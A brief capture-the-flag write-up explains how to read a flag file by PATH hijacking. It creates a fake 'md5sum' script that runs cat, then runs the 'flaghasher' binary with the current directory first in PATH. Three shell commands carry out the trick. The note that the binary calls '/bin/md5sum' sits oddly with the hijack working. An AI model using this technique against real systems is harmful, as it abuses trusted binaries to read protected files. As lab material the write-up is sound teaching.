In this challenge, we SSH into a remote machine where a binary can be executed.
The binary uses "/bin/md5sum" to hash the flag file.

In order to solve this, we need to change the md5sum command to cat.
Do this by creating a bash script file with the name md5sum, then run the binary with current directory as the PATH.

Commands:
"""
echo -e '#!/bin/bash\ncat "$1"' > md5sum
chmod +x md5sum
PATH=.:$PATH ./flaghasher
    """
